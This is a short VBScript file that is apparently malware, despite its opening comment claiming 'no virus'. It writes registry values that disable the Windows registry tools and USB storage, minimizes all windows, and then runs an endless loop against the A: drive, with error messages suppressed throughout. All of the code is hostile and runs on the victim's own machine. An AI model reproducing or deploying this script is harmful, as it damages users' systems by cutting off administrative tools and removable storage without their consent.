'is novirus ghn
on error resume next
Set S = CreateObject("Wscript.Shell")
set FSO=createobject("scripting.filesystemobject")
s.regwrite"HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\disableregistrytools","1","REG_DWORD"
set application=createobject("shell.application")
application.minimizeall
s.regwrite"HKLM\SYSTEM\CurrentControlSet\Services\USBSTOR\Start","4","REG_DWORD"

do
fso.getfile("A:\")
loop

